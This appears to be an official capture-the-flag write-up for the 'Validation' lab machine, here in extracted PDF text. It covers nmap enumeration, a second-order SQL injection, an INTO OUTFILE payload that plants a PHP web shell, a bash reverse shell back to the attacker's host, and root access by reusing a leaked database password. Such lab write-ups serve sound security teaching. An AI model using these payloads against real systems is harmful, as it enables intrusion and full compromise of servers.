@@ -1,0 +1,259 @@
+Validation
+
+14th July 2023 / Document No D23.100.246
+
+Prepared By: C4rm3l0
+
+Machine Author: ippsec
+
+Difficulty: Easy
+
+Classification: Official
+
+Synopsis
+
+Validation is an Easy Difficulty Linux machine that features a web application susceptible to a second-order
+
+SQL Injection. Capitalizing on this vulnerability, an attacker can inscribe a web shell into the system, leading
+
+to Remote Code Execution ( RCE ). Following the initial foothold, privilege escalation is accomplished through
+
+the exploitation of a re-used database password, leading to root -level access to the machine.
+
+Skills Required
+
+Web Enumeration
+
+SQL Injection
+
+Skills Learned
+
+Second-Order SQL Injection
+
+Linux command line
+
+================================================================================
+Page 1
+================================================================================
+
+Enumeration
+
+Nmap
+
+Nmap reveals that ports 22  (SSH), 80  (HTTP), 4566  (HTTP), and 8080  (HTTP) are open. Only Port 80  gives
+
+us a page, so we will start our enumeration there. Interestingly, based on the OpenSSH  version, the host
+
+appears to be running Ubuntu , whereas the Apache  service on port 80  indicates that Debian  is running.
+
+This indicates that there might be some containerisation taking place on the target system, which is good to
+
+keep in mind during exploitation.
+
+HTTP
+
+Navigating to port 80  reveals a single page that asks for a username and a dropdown box to select a
+
+country.
+
+ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.116 | grep '^[0-9]' | cut -d '/' -f 1 |
+
+tr '\n' ',' | sed s/,$//)
+
+nmap -p$ports -sC -sV 10.10.11.116
+
+================================================================================
+Page 2
+================================================================================
+
+If we press the Join Now  button and intercept the request using BurpSuite , we can see that the
+
+dropdown is just plaintext and we can modify it to values other than a country.
+
+Additionally, the page will send us a cookie back called user  and direct us to /account.php .
+
+================================================================================
+Page 3
+================================================================================
+
+If we send this request multiple times, we will notice the cookie it is giving us does not change until we
+
+change the Username  variable, indicating that the session is not random.
+
+Given the length of the cookie (32 characters), we assume that it might be the MD5  hash of the given
+
+username, which we verify:
+
+Our theory is confirmed, as the output matches the returned cookie's.
+
+If we edit the registration request and place a Single Quote '   in the country  parameter the account page
+
+displays an error message.
+
+echo -n "melo" | md5sum
+
+POST / HTTP/1.1
+
+Host: 10.10.11.116
+
+================================================================================
+Page 4
+================================================================================
+
+If we change the payload from Brazil'  to Brazil' -- - , the error message goes away, confirming that
+
+this is indeed a SQL Injection.
+
+The -- -  sequence is a comment in some of the most commonly used SQL services and can
+
+therefore be used to submit payloads that ignore any SQL that might follow the injected parameter.
+
+For instance, consider the following query that might be run in the backend:
+
+If we can inject the $country  parameter we can perform arbitrary queries and escape the rest of the
+
+query by suffixing our injection with a comment -- . Consider the payload ' OR 1=1;-- .
+
+We injected a boolean statement that always resolves to True , and got rid of the rest of the
+
+statement.
+
+If you wish to learn more about the intricacies of SQL Injections, it is highly recommended you take a
+
+look at our SQL Injection Fundamentals Academy Module.
+
+Foothold
+
+Second Order SQL Injection
+
+The easiest way to exploit this is to open two Repeater  tabs in BurpSuite , one for registering accounts
+
+and the other for viewing the account.php page. The workflow is:
+
+User-Agent: Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0
+
+Accept:
+
+text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Content-Type: application/x-www-form-urlencoded
+
+Content-Length: 28
+
+Origin: http://10.10.11.116
+
+Connection: close
+
+Referer: http://10.10.11.116/
+
+Cookie: user=fe0e2fe499dba85ed54677a881e39d41
+
+Upgrade-Insecure-Requests: 1
+
+username=melo&country=Brazil'
+
+Fatal error: Uncaught Error: Call to a member function fetch_assoc() on bool in
+
+/var/www/html/account.php:33 Stack trace: #0 {main} thrown in /var/www/html/account.php
+
+on line 33
+
+SELECT username FROM users WHERE country='$country' ORDER BY username DESC LIMIT 1;
+
+SELECT username FROM users WHERE country='' OR 1-1;-- ORDER BY username DESC LIMIT
+
+1;
+
+================================================================================
+Page 5
+================================================================================
+
+1. Go to the registration tab.
+
+2. Change the username (to get a different cookie).
+
+3. Place an SQL Injection payload in the Country  parameter and then register.
+
+4. Copy the cookie and paste it into the second tab ( Account.php ).
+
+By sending the country of Brazil' Union Select 1-- - , we see the page no longer displays an error,
+
+which tells us the SQL Query is returning only one column.
+
+================================================================================
+Page 6
+================================================================================
+
+Knowing that we can perform a Union  Injection and that this is a PHP  application, we can attempt to use
+
+the INTO OUTFILE  statement of SQL  to drop a web shell. We try injecting the following payload:
+
+Make sure to also visit the /account.php  site after submitting the payload, since the query will not
+
+actually trigger until you try loading the page- hence, SQLi of the second order.
+
+Submitting the payload in the same way as before returns SQL  errors on the webpage, however, that is
+
+attributed to the fact that our query does not return any rows or columns. By navigating to /shell.php ,
+
+however, we can verify that the file was successfully created.
+
+We can now execute arbitrary commands on the target system using the ?cmd=  parameter.
+
+Brazil' UNION SELECT "<?php SYSTEM($_REQUEST['cmd']); ?>" INTO OUTFILE
+
+'/var/www/html/shell.php'-- -
+
+curl http://10.10.11.116/shell.php?cmd=id
+
+================================================================================
+Page 7
+================================================================================
+
+At this point, gaining a fully interactive shell is trivial; we start by creating a Netcat  listener on port 4444 :
+
+Next, we submit a typical reverse shell payload that will a callback to our listener, using cURL :
+
+We instantly get a response and now have a full shell as www-data :
+
+The user  flag can be found at /home/htb/user.txt .
+
+Privilege Escalation
+
+Our shell initially landed us inside the /var/www/html/  directory, where we find a config.php  file.
+
+nc -nlvp 4444
+
+curl 10.10.11.116/shell.php --data-urlencode 'cmd=bash -c "bash -i >&
+
+/dev/tcp/10.10.14.7/4444 0>&1"'
+
+cd /var/www/html
+
+cat config.php
+
+================================================================================
+Page 8
+================================================================================
+
+The configuration file reveals a database password, which contains the words "global-pw". Password re-use
+
+is one of the most common misconfigurations, so we attempt to use the obtained password uhc-9qual-
+
+global-pw  to switch to the root  user.
+
+While we don't get any output initially, running the id  command reveals that we successfully authenticated
+
+as the root  user and have fully elevated our privileges on the target.
+
+The final flag can be found at /root/root.txt .
+
+su -
+
+================================================================================
+Page 9
+================================================================================
